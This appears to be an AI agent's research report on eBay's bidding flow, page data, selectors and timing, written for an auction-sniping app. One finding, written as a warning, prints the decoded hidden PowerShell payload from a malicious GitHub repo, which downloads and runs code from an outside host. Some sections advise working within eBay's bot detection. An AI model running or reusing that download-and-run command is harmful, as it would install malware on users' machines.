  - evidence: jq6l43d1/ebay-sniper README (2026-10-09); owengregson v1 bot.js:69-110 (2025-11-17); RavidDimant main.py:28-39, 176-185 (2025-09); yangvianno/ProxySnipe utils/login_helper.py (2025-04).
  - implication: Let the user sign in by hand in the WebView. Expect Google OAuth to refuse an embedded WebView (inferred from the automated-browser block) and handle passkey prompts.
- **AB5** [medium] Pacing that projects settled on: at least 2 s plus 0-2 s jitter between requests, 8 s backoff on a block, and a circuit breaker after 6 consecutive blocks with a 900 s cooldown (dealfinder); retries after 4 s and 8 s with calls spaced about 10 s (xwebmcp); 'community consensus is keep <20 req/min/IP' (printing-press brief, unverified).
  - evidence: camh000/dealfinder EbayScraper.py:79-92 (2026-09/10); kernel/xwebmcp get_listing.js:118 and tool description; printing-press research brief line 10 (2026-04-30).
  - implication: Apply a breaker to the monitor and space checks of different items; eBay's own refreshInSeconds already gives a safe per-item rate.
- **AB6** [high] Signed-out redirects go to https://signin.ebay.<tld>/ws/eBayISAPI.dll?SignIn&...&ru=<requested URL>; sometimes to https://www.ebay.com/ws/eBayISAPI.dll?SignIn&siteid=...&ru=...&sgfl=..., titled 'Sign in or Register | eBay'. Since about 23 Jul 2026, anonymous sold/completed searches go to sign-in.
  - evidence: zombu4/Greedbay-Detective src/ebay/PageCheck.h (2026-10-18/19); pauljones0/snipesnipe browser.py:179; camh000/dealfinder EbayScraper.py:96-99.
  - implication: In the WebView, any main-frame navigation to a signin.* host or /ws/eBayISAPI.dll?SignIn means 'sign-in required'; pause snipes and notify the user.
- **AB7** [low] Value Added Resource reported on 14 Jul 2025 that eBay added phone verification to bidding, with the stated aim of 'reducing sniping, shill bidding & unpaid items'.
  - evidence: https://www.valueaddedresource.net/ebay-tests-extended-bidding-trading-card-auctions/ (2025-07-07, updated 2025-07-14).
  - implication: Do a dry run (open the layer and type, no submit) long before the end, so a phone-verification prompt surfaces while the user can act.
- **EB1** [high] Extended Bidding timeline. Jul 2025 test: 'extending auction durations by 2 minutes when a bid is placed in the last 2 minutes', select Trading Cards, banners on UK/CA/AU help pages. Page bundles on ebay.com and ebay.co.uk (2026-01 to 2026-04) say 'Bids in the last 2 minutes add time' and 'Time left in the auction resets to 2 minutes with each bid'. 17 Aug 2026: all auctions in Australia, 'the remaining time will reset to 60 seconds'. eBay Motors also. The UK help page today: 'We're testing extended bidding on auction listings in some categories. Any bid placed in the final 60 seconds resets the clock to 60 seconds.'
  - evidence: valueaddedresource.net articles of 2025-07-07 and 2026-08-03 (updated 2026-08-23); popcornBiddingContent in the 2026-01-14 US, 2026-02-11 UK and 2026-04-27 UK snapshots; gixen.com/blog/ebay-auction-time-extensions/ (2026-09-23); WebFetch https://www.ebay.co.uk/help/buying/bidding/bidding?id=4003 (2026-11-04).
  - implication: A last-second snipe on an extended auction gives rivals 60-120 s to respond. Detect extension, keep monitoring after the bid, and tell the user the advantage is reduced.
- **EB2** [medium] Per-listing extension data: auctionData {endAtOrAfter, biddingEndedAt, extendedBidding} (extendedBidding was null on every captured 2026 listing), and UI strings preWindowTitle 'This auction may extend', postWindowTitle 'Each bid now adds more time', preWindowBodyText 'Bids in the last 2 minutes add more time.', postWindowBodyText 'New bids reset the time left to 2 minutes.'. In the US auction 127622190770 (2026-01), bids went from 5 to 13 in the last 2 minutes and biddingEndedAt still equalled the scheduled end, so that listing did not extend.
  - evidence: listingV2ById auctionData in the 2026-01, 2026-04 and dealfinder 2026-07/09 pages; AUTO_REFRESH 20260121005853 (5 bids at 1m49s left) versus the ended page 20260123010506 (13 bids).
  - implication: Treat a non-null extendedBidding, a visible extension section, or a moved endTime as an extended auction. What extendedBidding holds when set is unknown.
- **EB3** [high] Gixen's response to extensions (2026-09-23): 'extend the auction end time 1 minute from the time of the last bid'; Gixen bids incrementally, detects extensions as late as possible (3 calls to eBay instead of one), waits up to 12 extensions before sending the maximum, defaults to 6 s on extended auctions (its mirror server bids 1 s before the end), and saw its win rate drop about 10%.
  - evidence: https://www.gixen.com/blog/ebay-auction-time-extensions/ (2026-09-23).
  - implication: A strategy option for extended auctions: either place the full max once and accept proxy outcomes, or follow Gixen's incremental approach. That is a product decision to put to the user.
- **TL1** [high] Lead times used: VincenzoImp 1 s (ebay.it, 2024-10); jq6l43d1 1.5 s default with an optional calibrated value (p95 RTT + 300 ms, minimum 500 ms), schedule wake at T-90 s (2026-10); owengregson v1 1200 ms + RTT, v2 two workers at 1900 and 1600 ms + median RTT + 200 ms, snipe window from T-12 s, reported real win (2025-11); isaaclkchong primary T-6 s, backup T-3 s, prep at T-30 s (2026-02); snipesnipe 6 s default (3-60) (2026-10); Gixen 6 s on extended auctions (2026-09); jtstothard 8 s (API stub); esniper 10 s, prebid at 150 s (2019); Biet-O-Matic 10 s default (2021); printing-press 25 s default (2026-04); PsychedelicPalimpsest 10 s example with a 60-90 s pre-open (2024-07).
  - evidence: VincenzoImp bidder.ipynb; jq6l43d1 snipe.py:439, 565, 314-347; owengregson v1 bot.js:211, v2 src/config/sniper.config.json:9-22; isaaclkchong mercury/config.py:19-20 and sniper.py:334-341; snipesnipe models.py:61; gixen blog; jtstothard SPEC.md:120; esniper esniper.c:65, auction.c:1009; Biet-O-Matic contentScript_offer.js; printing-press internal/cli/snipe.go:107; PsychedelicPalimpsest README.
  - implication: A 1.5-6 s lead with the layer pre-opened is what working tools use. Make the lead configurable, default it in that range, and show measured latency.
- **TL2** [medium] Timing measurements available: jq6l43d1 calibrates by timing GET https://www.ebay.com/ several times and busy-waits in 0.5 ms steps from 0.5 s before the target; owengregson takes the median of 3 page.goto timings; snipesnipe's local scheduler fired 58 ms after target (a 50 ms tick; over 1 s late counts as missed); Biet-O-Matic warns when its timer is more than 1100 ms late; isaaclkchong polls 1.5 s for confirmation and re-checks at T+2 s and T+10 s. No source measured the click-to-confirmbid round trip.
  - evidence: jq6l43d1 snipe.py:314-347, 522-527; owengregson src/timing/latency.js; snipesnipe docs/validation.md and README 'Timing and recovery'; Biet-O-Matic contentScript_offer.js confirmBid(); isaaclkchong sniper.py:380-418.
  - implication: Measure the round trip on the phone: hook the confirmbid XHR in the WebView and log submit-tap to response per snipe, then tune the lead from real data.
- **TL3** [medium] Clock sync approaches: snipesnipe takes eBay's HTTP Date header at the request midpoint and refuses API snipes when the clock is off by more than 2.5 s; jtstothard and isaaclkchong query pool.ntp.org; isaaclkchong's 'offset' compares Python time with the browser's Date.now(), which measures nothing about eBay.
  - evidence: pauljones0/snipesnipe snipesnipe/ebay.py request(); jtstothard src/sniper/core/ntp.py; isaaclkchong mercury/clock_sync.py.
  - implication: Estimate the offset to eBay from AUTO_REFRESH (formattedText seconds versus endTime) or from the Date header of in-page fetches; Android's network time alone may be off by hundreds of ms (inferred).
- **UR1** [high] Item URL shapes: /itm/<id>, /itm/<slug>/<id>, /itm/-/<id> (common in captures), host variants www., m. and bare. Query forms: item=, itemId=, iid=. Every 2024-2026 example ID has 12 digits; tool validators accept 9-15 (snipesnipe, fxebay), 9-14 (xwebmcp) or 9-13 (tamnd). Common regex: /itm/(?:[^/?#]+/)?(digits 9-15). The legacy form is cgi.<site>/ws/eBayISAPI.dll?ViewItem&item=<id>.
  - evidence: pauljones0/snipesnipe models.py and extension/content.js:3 (2026-10-15); Puyodead1/fxebay worker/src/index.js:115-123 (2026-10-23); tamnd/ebay-cli ebay/ids.go (2026-06-29); Wayback CDX for www.ebay.co.uk/itm/ (400 captures 2025-01..2026-02); ruippeixotog common.conf (2019).
  - implication: Normalize every input to https://www.<site>/itm/<id> and keep the site of the shared link.
- **UR2** [high] Share links from the app and web use ebay.us/m/<code> (or ebay.us/<code>), 4-12 alphanumerics, and 301 to the item on the sharer's site with marketing parameters, e.g. https://ebay.us/m/100axl -> https://www.ebay.co.uk/itm/317437438212?mkcid=16&mkevt=1&mkrid=711-127632-2357-0&ssspo=...&sssrc=2051273&ssuid=...&stype=1&var=&widget_ver=artemis&media=TW (2025-10-27). media also takes SMS, COPY or PINTEREST.
  - evidence: Wayback archived 301s for ebay.us/m/100Blw (2026-01-31), 100axl (2025-10-27), 100aeV (2025-09-07); Puyodead1/fxebay worker/src/index.js:77-110 and fetcher/app.py /short/ route.
  - implication: Resolve ebay.us by letting the WebView follow the redirect (or a HEAD in-page) and read the final /itm/<id>. Do not assume the site is ebay.com.
- **UR3** [medium] ebay.io/m/<code> share links also exist: https://ebay.io/m/MLxzM3 returned 301 to eBay Canada item 287644397617 (2026-10).
  - evidence: pauljones0/snipesnipe docs/validation.md:27 and snipesnipe/models.py item_reference() (2026-10-15).
  - implication: Accept ebay.io/m/ as well as ebay.us/m/.
- **UR4** [medium] m.ebay.co.uk/itm/<slug or ->/<id>?... answered 301 to the same path and query on www.ebay.co.uk for the Wayback crawler (2025-08 and 2025-09). The crawler probably used a desktop user agent (inferred).
  - evidence: Wayback archived 301 Location headers for m.ebay.co.uk/itm/-/262896136247 (2025-09-08) and m.ebay.co.uk/itm/0-10-Amp-.../201546868150 (2025-08-26).
  - implication: Handle m. links by ID extraction. Whether the Pixel's WebView (mobile UA) gets a different layout is unverified (open question).
- **UR5** [high] Tracking parameters seen on item URLs and safe to strip: _skw, itmmeta, hash=item<hex>:g:<image key>, itmprp=enc:..., _trksid, mkcid, mkevt, mkrid, ssspo, sssrc, ssuid, stype, widget_ver, media, sojTags, roken, campid, customid, toolid, siteid, _mwBanner, nordt, rt, epid, ul_ref, _rdt, ul_noapp. var= identifies a variation of a fixed-price listing.
  - evidence: Wayback CDX rows for www.ebay.co.uk/itm/ and m.ebay.co.uk (2025-2026); app share links in gaucho1978/BACCAble README (2026-08-28) such as https://www.ebay.de/itm/165688561910?...&var=465201636033&widget_ver=artemis&media=COPY.
  - implication: Strip them for canonical URLs and dedupe; keep var only for non-auction listings.
- **UR6** [high] Variations exist only on fixed-price listings. The Trading API defines 'Variations are multiple similar (but not identical) items in a fixed-price listing.'; REST IDs look like v1|<legacyId>|<variationId>, with 0 for none; variation pages carry [data-testid='x-msku-evo'] and an inline model with selectMenus, menuItemMap and variationsMap.
  - evidence: WebFetch https://developer.ebay.com/devzone/xml/docs/reference/ebay/types/VariationsType.html (2026-11-04); jtstothard src/sniper/core/ebay_client.py _normalize_item_id (2026); kernel/xwebmcp get_listing.js:235-254.
  - implication: An auction URL should never need var=. If a pasted link has x-msku-evo or no x-bid-action, reject it as not an auction.
- **UR7** [high] Site differences in 2025-2026 are wording and money format; the model structure is the same. ebay.co.uk: '£5.37', 'Postage:', 'Submit bid', dates 'Sun, 14 Dec at 5:35 PM', zone GMT/BST, Buyer Protection fee line, UK increment table. ebay.com: 'US $69.99', 'Shipping:', 'Place bid', 'Tue, Jan 20 at 5:00 PM', PST/PDT. ebay.de: 'EUR 7,50', 'Gebot'/'Gebote', 'Endet in', MEZ/MESZ, 'Beendet'. The model's formattedValue fields are always in MST.
  - evidence: Snapshots listed above for UK and US; AUTO_REFRESH captures for DE (2026-02, 2026-04); dealfinder fixture with marketplaceListedOn EBAY_DE viewed on ebay.co.uk (2026-09).
  - implication: One parser built on value fields covers all sites; only status-text matching needs per-locale strings. jq6l43d1's claim that 'other regional sites use different page layouts' is not borne out for the item model.
- **SR1** [high] andrey-ivanov-eng1998x8/ebay-sniper-tool-2 is malware. Line 1 of sniper.py, after a long run of spaces, has exec(base64(...)) that decompresses to a hidden PowerShell 'iex DownloadString(http://soft-storage.top/worker?=8530444425/test)'. An hourly GitHub Action commits 'chore: nightly tidy' so the repo looks active (pushed 2026-11-04).
  - evidence: Static decode only (python -I, never executed) of /var/tmp/sniper-research/src/andrey-ivanov-eng1998x8_ebay-sniper-tool-2/repo/sniper.py (now deleted) and .github/workflows/nightly.yml.
  - implication: Exclude it from any reference list; similar names (bludmoon-coverbang/Bayside-Sniper 'free download', todd-mandell/ebay-sniper with a single .7z) were skipped as likely lures.
- **SR2** [medium] Several 2025-2026 repos contain guessed or untested eBay code: isaaclkchong bid selectors (input[data-testid='x-bid-input'], [data-testid='x-confirm-bid']), sackio/unibrowse macros marked reliability 'untested', gixen-cli's MakeBid poster, bcortez183 and printing-press code paths that assume replayable tokens, and nicholasb4711/daninger4995 copies of 2017 selectors (#MaxBidId, a[id*='reviewBidSec_btn']).
  - evidence: isaaclkchong mercury/auction.py SELECTORS (2026-02-12); sackio/unibrowse macros/ebay-sniper-macros.js (2026-04-14); hsukenooi/gixen-cli ebay_bidder.py (2026-04-27); bcortez183/ebay-sniper ebay_sniper.py (2026-06-11); nicholasb4711/EbayBidSniper bidsniper.py (2025-01-13); daninger4995/ebay-auto-bid app.py (2023-07-27).
  - implication: Trust observed captures (printing-press sniff report, Greedbay recon, xwebmcp, adbertram, dealfinder, fxebay, Wayback) over these when they disagree.
- **SR3** [high] How the flow changed. 2014-2019: offer.ebay MakeBid review then confirm page with uiid/stok/srt. 2017: a JSON /bfl/placebid power-bid layer appears. 2019-2021: item page #MaxBidId + #bidBtn_btn opening offer.ebay with input[name=confirmbid]; end time in a raptor JS endTime epoch and span.timeMs[timems]. 2024: AUTO_REFRESH itemmodules JSON, ?bolp=1, #bid-offer-summary, power-bid buttons. 2025: place-bid-actions layer, no confirm step. 2026: POWER_BID_LAYER via /experience/auction/v2/bid/module_provider, .placebid-redesign-wrapper, trisk + confirmbid JSON POSTs, UK label 'Submit bid', and extended bidding rolling out.
  - evidence: ruippeixotog common.conf (2019); esniper auction.c (2019); Wayback /bfl/placebid 2017 JSON; Biet-O-Matic EbayParser.js:196-206, 342-345 (2021); PsychedelicPalimpsest (2024-07); RavidDimant and ProxySnipe (2025); owengregson (2025-11); printing-press (2026-04); snapshots 2026-01..07.
  - implication: Expect the layer markup to keep changing. Build the bid step on several selector chains, a dry-run check each day an auction is armed, and on-device debug dumps like jq6l43d1's dump_debug().

## Open questions
- What does the 2026 ebay.co.uk bid layer look like for a signed-in user in the Pixel 9a WebView? Capture its container class, input id, submit label, quick-bid buttons, the 'Enter £X or more' or too-low error text and its selector.
- Do SEMANTIC_DATA.isHighBidder, auctionData.bidderAuctionDetails.userBiddingStatus, AUTO_REFRESH viewer_item_relation and STATUS_MESSAGE change for a signed-in bidder? What are the exact UK texts for winning, outbid, won, lost and reserve not met?
- When Extended Bidding applies, what does auctionData.extendedBidding contain, and does AUTO_REFRESH bidInfo.endTime move in place after each extending bid? Does the UK test use 60 s (help page, 2026-11-04) or 2 min (page bundle, 2026-01 to 04), and in which categories?
- Does the Android WebView's default mobile user agent get the same ViewItem_Evo model and bid layer, or a different mobile web layout? Is a desktop user-agent override needed or safe?
- Does eBay treat the Android WebView differently (UA token 'wv', X-Requested-With header) for sign-in, Akamai scoring or bidding?
- Do programmatic clicks and value setting (untrusted events) work in the bid layer, or does the app need real MotionEvent touches and key events?
- On UK private-seller auctions, is the typed maximum bid inclusive or exclusive of the Buyer Protection fee shown as 'incl. £X for Buyer Protection'?
- When does eBay require phone verification before bidding (reported July 2025), and what does the prompt look like?
- Does /itm/<id>?cta=placebid open the bid layer for a signed-in user, so it can be pre-opened about 60 s before the end?
- What is the real round trip from submit tap to the confirmbid response from a phone on UK Wi-Fi or mobile data? No source measured it; it should set the default lead.
- How strict is eBay about in-page AUTO_REFRESH polling faster than refreshInSeconds, e.g. every 1-2 s for several auctions at once?
- Which Google, Apple or passkey sign-in paths work inside the WebView, given that Google OAuth is blocked in embedded and automated browsers?

## Report
# eBay web bidding flow and item-page data (2024-2026), from open-source tools and archived pages

No request was sent to any eBay marketplace host. Sources:

- About 35 GitHub repos, read only, cloned under `/var/tmp/sniper-research/src/<owner>_<repo>/repo`.
- Wayback Machine raw snapshots (`id_`), saved under `/var/tmp/sniper-research/wayback/`:
  - item pages in `live_dec/` and `snaps_dec/`;
  - AUTO_REFRESH JSON in `autorefresh_dec/`.
- Four WebFetches of eBay help and developer pages.
- Third-party articles from Value Added Resource and the Gixen blog.

Every claim carries a source date. "Inferred" marks anything not observed directly. All archived pages were captured signed out (Wayback crawler). Signed-in variants are therefore inferred or come from tool code.

---

## 1. What the app should do

1. **Read state from the embedded JSON page model, not from DOM text.** Use the SEMANTIC_DATA and BUY_BOX modules plus the GraphQL-shaped `auctionData`. They give:
   - the end time to the millisecond;
   - price and currency as numbers;
   - bid count and status;
   - reserve flag, high-bidder flag, seller and origin site.

   JSON-LD has no end time. The countdown text is too coarse to schedule from.
2. **Monitor by calling `/itemmodules/<id>?module_groups=AUTO_REFRESH&...` from inside the loaded page** (same-origin `fetch`). Respect `refreshInSeconds`; this is the call eBay's own page makes.
3. **Bid through the real bid layer in the WebView.** The sequence:
   1. `#bidBtn_btn` opens the layer;
   2. type the amount into the layer input;
   3. press the primary submit button.

   Do not rebuild the `/bfl/placebid` POSTs. They need a fresh Forter token, an `srt` CSRF token and Akamai clearance.
4. **Plan for Extended Bidding.** It is live in Australia and eBay Motors, and in test in some UK and US categories (60 s, earlier 2 min). After the snipe, keep polling: the end time can move.
5. **Decide the result after the end** from:
   - `listingStatus`, `auctionData.biddingEndedAt` and the status message;
   - `isHighBidder` and `bidderAuctionDetails.userBiddingStatus` (signed-in values inferred);
   - the item showing up in My eBay purchases.
6. **Handle the walls.** For each wall below:
   - sign-in redirect: pause and ask the user;
   - `/splashui/challenge`: wait in place;
   - `/splashui/captcha`: hand the WebView to the user;
   - `Error Page | eBay`: back off at least 8 s with jitter.
7. **Pixel 9a note (inferred).** Its WebView is Android System WebView (Chromium), the same engine as Chrome, so eBay's scripts, Akamai sensor and Forter token generation run normally. It sends a mobile user agent by default, which may produce a mobile layout (see open questions). Do eBay traffic only in the WebView, never in OkHttp: eBay rejects non-browser TLS fingerprints (section 7).

---

## 2. Item page: machine-readable data

### 2.1 Where the data lives

| Location | What it holds | Seen |
|---|---|---|
| Inline `<script>` model `...concat({"o":{"l":1,"g":{...}}})`, module `"SEMANTIC_DATA":{"_type":"SemanticDataModule",...}` | status, end/start, bid count, price, reserve flag, high-bidder flag, seller, marketplace, bid-layer prefetch URL, auctionData | 2025-04 to 2026-09 (ebay.co.uk, ebay.com, ebay.de listings) |
| Same model, `"BUY_BOX":{"_type":"BuyBoxModule",...}` | `bidPrice`, `bidInfo.bidCount`, `bidInfo.endTime` (TimerModel), `bidPriceApprox`, `bidPriceProgram`, `bidAdditionalInfo` | same |
| Same model, `"BUY_BOX_CTA":{"_type":"BuyBoxActionModule",...}` | the bid CTA (`actionId:"BID"`, `moduleKey:"CTA_BID_BUTTON"`), watch toggle, errors | 2026-01 to 2026-07 |
| Same model, `"STATUS_MESSAGE":{"_type":"LayoutSectionModule",...}` | ended/sold/ended-by-seller text | ended pages 2025-04 to 2026-09 |
| Same model, `"AUTOREFRESH":{"_type":"AutoRefreshModule",...}` | polling URL and `refreshInSeconds` | live auctions 2026 |
| Same script, GraphQL-shaped `"data":{"listingV2ById":{...}}` | `auctionData {endAtOrAfter, biddingEndedAt, extendedBidding, bidderAuctionDetails{userBiddingStatus}}`, `listingLifecycle.endDate` (string), `watchCount` | 2026-01 to 2026-09 |
| `<script type=application/ld+json>` Product | price, currency, availability, shippingDetails, images; **no end time** | 2026 |
| `var GHpre = {...}` in the header | `userAuth`, `userId`, `fn` (first name), `shipToLocation` | 2026 |
| `"signedIn":false` in the model config | viewer sign-in flag | 2026 |

The model's global variable name changes between builds. Search for module keys instead:

| Date | Global variable |
|---|---|
| 2025-06 | `$MC` |
| 2025-12 to 2026-04 | `$M_96613636_C` |

### 2.2 SEMANTIC_DATA, verbatim (ebay.co.uk live auction, Wayback 2026-04-27 11:07:48 UTC, `meta` removed, seller redacted)

Source: `https://web.archive.org/web/20260427110748id_/https://www.ebay.co.uk/itm/127820098965`

```json
{"_type":"SemanticDataModule",
 "refreshTimers":{"itemEnding":{"value":"2026-04-27T11:13:22.000Z","formattedValue":"2026-04-27 04:13 AM MST"},"sameDayDeliveryCutoff":null},
 "bidPrefetch":{"_type":"Action","URL":"/experience/auction/v2/bid/module_provider?item_id=127820098965&modules_group=POWER_BID_LAYER&refresh_page=false&prefetch_page=true&_trksid=p4429486.m2548.l4626","type":"NAV","name":"TXN_FLOW","params":{"listingId":"127820098965"},"clientPresentationMetadata":{"cta":"BID"}},
 "enableAuctionRefresh":false,"isHighBidder":false,"marketplaceListedOn":"EBAY_GB","listingLocale":"en_GB","listingStatus":"ACTIVE",
 "singleSkuOutOfStock":false,"immediatePay":true,"sellerUserName":"<seller>","listingId":"127820098965","bidCount":1,
 "auctionPossible":true,"hasReservePrice":false,
 "startDate":{"value":"2026-04-20T11:13:22.000Z","formattedValue":"2026-04-20 04:13 AM MST"},
 "endDate":{"value":"2026-04-27T11:13:22.000Z","formattedValue":"2026-04-27 04:13 AM MST"},
 "exchangeRate":{"value":1,"currency":"GBP"},
 "currentBidPrice":{"value":5.37,"currency":"GBP"},
 "auctionData":{"endAtOrAfter":"2026-04-27T11:13:22Z"},
 "guestCheckout":true}
```

Variants seen in other snapshots:

**Ended listing.** Added fields:
- `"listingStatus":"ENDED"`;
- `"auctionData":{"endAtOrAfter":"...","biddingEndedAt":"..."}`;
- `"singleSkuOutOfStock":true` when sold.

Seen in 20260123010506 and 20260105125151.

**Relisted.** Adds `"relistedId":"146693414476"` (20250714035904).

**Ended early by the seller.** `refreshTimers.itemEnding` keeps the scheduled end; `endDate` and `biddingEndedAt` hold the actual end. Snapshot 20250623154440 (item 146521106925):

| Field | Value |
|---|---|
| start | 2025-04-16T04:31:13Z |
| itemEnding (scheduled) | 2025-04-23T04:31:13Z |
| endDate (actual) | 2025-04-18T15:34:01Z |

**Cross-border (US listing viewed on ebay.co.uk).** Snapshot 20251209135725:

```json
"marketplaceListedOn":"EBAY_US",
"exchangeRate":{"value":0.7506,"convertedFromValue":1,"convertedFromCurrency":"USD","currency":"GBP"},
"currentBidPrice":{"value":18.76,"currency":"GBP","convertedFromValue":24.99,"convertedFromCurrency":"USD"}
```

### 2.3 BUY_BOX with TimerModel, verbatim (same 2026-04-27 UK page)

```json
{"_type":"BuyBoxModule","repositionCoupon":false,
 "bidInfo":{
   "bidCount":{"_type":"TextualDisplayValue","value":1,"textSpans":[{"_type":"TextSpan","text":"1 bid","styles":["PSEUDOLINK"]}],
     "action":{"_type":"Action","URL":"https://www.ebay.co.uk/bfl/viewbids/127820098965?item=127820098965&rt=nc&_trksid=p4429486.m145235.l2565","type":"NAV"}},
   "endTime":{"_type":"TimerModel",
     "endTime":{"value":"2026-04-27T11:13:22.000Z","formattedValue":"2026-04-27 04:13 AM MST"},
     "urgencyTime":{"value":"2026-04-27T10:13:22.000Z"},
     "counterStartTime":{"value":"2026-04-26T11:13:22.000Z"},
     "label":{"_type":"TextSpan","text":"Ends in"},
     "minutes":{"_type":"TextSpan","template":"{mm}m"},"seconds":{"_type":"TextSpan","template":"{ss}s"},
     "appendText":{"_type":"TextSpan","text":"27 Apr, 2026 12:13:22 BST"},
     "sequence":["minutes","seconds"],
     "formattedText":{"_type":"TextualDisplay","textSpans":[{"_type":"TextSpan","text":"5m 33s"}]},
     "expiredText":{"_type":"TextualDisplay","textSpans":[{"_type":"TextSpan","text":"Ended"}]}},
   "timerTextMap":{"today":"Today","tomorrow":"Tomorrow"}},
 "bidPrice":{"_type":"TextualDisplayValue","value":{"value":5.37,"currency":"GBP"},"textSpans":[{"_type":"TextSpan","text":"£5.37"}]}}
```

TimerModel fields:

| Field | Meaning |
|---|---|
| `endTime.value` | the end |
| `urgencyTime` | end minus 1 hour |
| `counterStartTime` | end minus 24 hours |
| `days`/`hours`/`minutes`/`seconds` templates and `sequence` | drive the countdown (over a day: `["days","hours","minutes","seconds"]`, rendered "6d 1h") |
| `appendText` | full timestamp with seconds and zone: US "Jan 20, 2026 17:00:44 PST", UK "27 Apr, 2026 12:13:22 BST", DE "03. Apr. 2026 20:20:04 MESZ" |
| `formattedValue` | always MST (eBay server time) |

Other BUY_BOX variants:

| Variant | Snapshot | What it adds |
|---|---|---|
| Cross-border | 20251209135725 | `"bidPrice"` text "US $24.99" with converted value, `"bidPriceApprox"` "£18.76", `"bidPriceApproxLabel"` "Approximately" |
| UK private seller | 20251207184835 | `"bidPriceProgram"` textSpans "incl. £0.94 for " + "Buyer Protection" (action `VI_BUYER_PROTECTION`, `params.priceType:"STARTING_BID_PRICE"`); bidPrice £15.94 is therefore £15.00 + fee |
| Auction with Best Offer | 20251207184835 | `"bidAdditionalInfo":[{"additionalText":{"textSpans":[{"text":"or Best Offer"}]}}]` |

### 2.4 GraphQL-shaped copy (dealfinder fixture `tests/fixtures/ebay_item_page_2026-07.html`, ebay.co.uk, signed out)

```
"auctionData":{"__typename":"AuctionData","endAtOrAfter":"2026-07-11T09:57:12Z","biddingEndedAt":null,"extendedBidding":null,
  "bidderAuctionDetails":{"__typename":"BidderAuctionDetails","userBiddingStatus":null}}
"listingLifecycle":{"__typename":"ListingLifecycle","endDate":"2026-01-21T01:00:44.000Z"}   (from the 2026-01 US page)
```

- `userBiddingStatus` uses the same field name as eBay's GraphQL `itemBiddingActivity`. That API returns `WINNING`, `OUTBID` or null (hsukenooi/comic-pipeline `apps/ebay/src/ebay_bid_status.py`, 2026-11-03).
- The value the item page shows for a signed-in bidder is inferred.

### 2.5 JSON-LD (2026-04 UK)

```json
{"@type":"Offer","url":"https://www.ebay.co.uk/itm/127820098965","itemCondition":"https://schema.org/UsedCondition",
 "availability":"https://schema.org/InStock","priceCurrency":"GBP","price":"5.37",
 "shippingDetails":[{"@type":"OfferShippingDetails","shippingRate":{"@type":"MonetaryAmount","value":"2.0","currency":"GBP"},
   "shippingDestination":{"@type":"DefinedRegion","addressCountry":"GBR"}}]}
```

`image` is an array of `https://i.ebayimg.com/images/g/<key>/s-l1600.jpg`.

There is no `availabilityEnds`. snipesnipe (`extension/content.js:55`, 2026-10-15) and isaaclkchong (strategy 6) depend on it, so their end-time fill stays blank.

### 2.6 DOM selectors (fallbacks; 2025-12 to 2026-04 snapshots unless noted)

| Field | Primary | Fallbacks | Example text |
|---|---|---|---|
| auction box | `[data-testid="x-bid-price"]` | `.x-bid-price`, `[data-testid="x-bid-action"]` | |
| current price | `[data-testid="x-price-primary"] .ux-textspans` | `.x-price-primary__price .ux-textspans`, `.x-price-primary span` | "£5.37", "US $69.99", "EUR 7,50" |
| approx price | `[data-testid="x-price-approx"] .x-price-approx__price` | | "Approximately £18.76" |
| bid count | `[data-testid="x-bid-count"] .ux-textspans--PSEUDOLINK` | `.x-bid-count a`, `.x-bid-count` | "1 bid", "13 bids", "4 Gebote" |
| bid history link | `[data-testid="x-bid-count"] a[href*="/bfl/viewbids/"]` | | needs sign-in |
| timer | `[data-testid="x-end-time"] .ux-timer__text` | `[data-testid="ux-timer_timer"]`, `.ux-timer` | "Ends in 5m 33s" ("Ends in " alone when ended) |
| end weekday/time | `.ux-timer__time-left` | | "Friday, 06:28 PM" (more than a day out; empty near the end) |
| title | `h1.x-item-title__mainTitle .ux-textspans--BOLD` | `[data-testid="x-item-title"] h1`, JSON-LD `name`, `og:title` | |
| seller | `.x-sellercard-atf__about-seller-item--seller-name a` | `[data-testid="x-sellercard-atf"] a span[class*=BOLD]`, `/str/<store>` link; SEMANTIC_DATA `sellerUserName` | |
| feedback | `.x-sellercard-atf__data-item` ("99.1% positive"), `.x-sellercard-atf__about-seller-item` ("(4,321)") | | |
| postage | `.ux-labels-values--shipping .ux-labels-values__values .ux-textspans--BOLD` | JSON-LD `shippingDetails` | "US $10.15", "Doesn't post to United States" |
| postage label | `.ux-labels-values--shipping .ux-labels-values__labels` | | UK "Postage:", US "Shipping:" |
| main image | `.ux-image-carousel-item.active img` (`data-zoom-src` s-l1600) | JSON-LD `image[0]`, `og:image` | |
| condition | `.x-item-condition-text .ux-textspans` | | |
| status banner | `[data-testid="d-statusmessage"]` | `.d-statusmessage__notice-live-region` | "Item sold on Sun, 14 Dec at 5:35 PM." |
| bid CTA | `#bidBtn_btn` | `[data-testid="x-bid-action"] a`, `[data-testid="x-bid-action"] button` | "Submit bid" (UK 2026), "Place bid" (US) |
| BIN / offer | `[data-testid="x-bin-action"]` `#binBtn_btn_1`, `[data-testid="x-offer-action"]` | | |
| auto-refresh placeholder | `[data-testid="x-auto-refresh"]` | | present on live auctions only |
| stable hooks | `[data-ebay-critical-module=BUY_BOX]`, `BUY_BOX_CTA`, `TITLE`, `SELLER_CARD_ATF`, `PICTURE` | | from 2026-02 |
| ship-to prompt | `.address-dialog__lightbox` (shown) | | Greedbay 2026-10-19 |
| variation listing | `[data-testid="x-msku-evo"]` | | xwebmcp 2026-10 |

Further DOM sources: Greedbay `src/browser/extractors/item.js` (2026-10-19 to 22), xwebmcp `domains/ebay.com/get_listing.js` (2026-10-26), adbertram `ebay/ebay_cli/browser_client.py` (2026), anntnzrb fixture `skills/current/ebay-live/tests/fixtures/item.html` (live markup 2026-10-07).

### 2.7 Signed-in and high-bidder signals

**Signed in.** Check any of:
- `window.GHpre.userAuth` (observed `false` signed out; `true` signed in is inferred);
- model `"signedIn":true` (inferred);
- `.gh-identity__greeting` text starting with "Hi" (owengregson 2025-11);
- `https://www.<site>/mye/myebay/summary` loading without a redirect to `signin.*` (adbertram 2026, PsychedelicPalimpsest 2024-07, Greedbay 2026-10).

Cookie presence is no signal: guests also get `dp1`, `nonsession`, `ebay`, `s`, `svid` (adbertram `browser.py`).

**High bidder.** Check:
- SEMANTIC_DATA `isHighBidder`;
- `auctionData.bidderAuctionDetails.userBiddingStatus`;
- after a bid, the layer text (section 5).

Both model fields must be verified signed in on the phone.

### 2.8 Reserve, minimum next bid, increments

**Reserve.** Use `hasReservePrice` (boolean). The current "reserve not met" text was not captured.

**Minimum next bid.** Not in the model. Derive it from:
- the first power-bid button in the layer ("Bid $X.XX"), or
- the current price plus the increment (the starting price when `bidCount == 0`).

